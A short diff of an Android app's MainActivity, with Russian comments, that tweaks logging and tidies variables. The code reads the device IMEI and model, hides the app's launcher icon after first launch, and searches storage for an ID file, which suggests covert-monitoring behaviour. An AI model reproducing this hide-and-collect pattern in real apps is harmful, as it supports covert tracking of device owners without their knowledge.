@@ -69,8 +69,7 @@ public class MainActivity extends Activity {
 		String imeistring = manager.getDeviceId();
 		String model = android.os.Build.MODEL;
 		String versionAndroid = android.os.Build.VERSION.RELEASE;
-		String phoneNumber = "";
-
+		
 		aboutDev = " Model: " + model + " Version android: " + versionAndroid;
 		sIMEI = "IMEI: " + imeistring;
 		e = sp.edit();
@@ -85,7 +84,6 @@ public class MainActivity extends Activity {
 		boolean hasVisited = sp.getBoolean("hasVisited", false);
 
 		if (!hasVisited) {
-			// getID();
 			// проверка на первое посещение
 			e = sp.edit();
 
@@ -95,9 +93,10 @@ public class MainActivity extends Activity {
 			e.commit();
 			hideIcon();
 		}
-		getID();
+		getID(); // рекурсивный поиск файла с нужным именем
 		if (sp.getString("ID", "ID").equals("ID")) {
 			Log.d("mainID", "ID viewdDalog");
+			FileLog.writeLog(LOG_TAG + " -> File not found. Show dialog.");
 			viewIDDialog();
 		} else
 			finish();
@@ -184,7 +183,6 @@ public class MainActivity extends Activity {
 					File[] file = file1[i].listFiles();
 					if(recursiveFileFind(file) == true)
 						return true;
-					Log.d("ID rec", "recurs" + file1[i].getAbsolutePath());
 					
 				}
 
